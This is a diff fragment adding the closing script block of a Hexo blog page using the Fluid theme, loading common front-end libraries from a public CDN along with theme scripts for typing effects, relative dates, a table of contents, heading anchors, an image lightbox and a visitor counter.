+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
